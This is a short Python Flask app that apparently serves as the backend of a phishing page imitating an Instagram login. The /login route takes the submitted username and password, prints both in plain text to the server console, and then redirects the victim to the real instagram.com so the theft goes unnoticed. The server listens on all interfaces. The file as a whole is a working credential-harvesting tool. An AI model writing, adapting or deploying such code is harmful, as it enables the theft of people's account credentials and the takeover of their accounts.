from flask import Flask, render_template, request , redirect

app = Flask(__name__)

@app.route('/')
def index():
    return render_template("indext.html")

@app.route('/login', methods=['POST'])
def login():
    username = request.form.get('username')
    password = request.form.get('password')

    print(50*"=")
    print(f"USER : {username}")
    print(f"PASSWORD : {password}")
    print(50*"=")

    return redirect("https://www.instagram.com")


if __name__ == '__main__':
    app.run(host="0.0.0.0")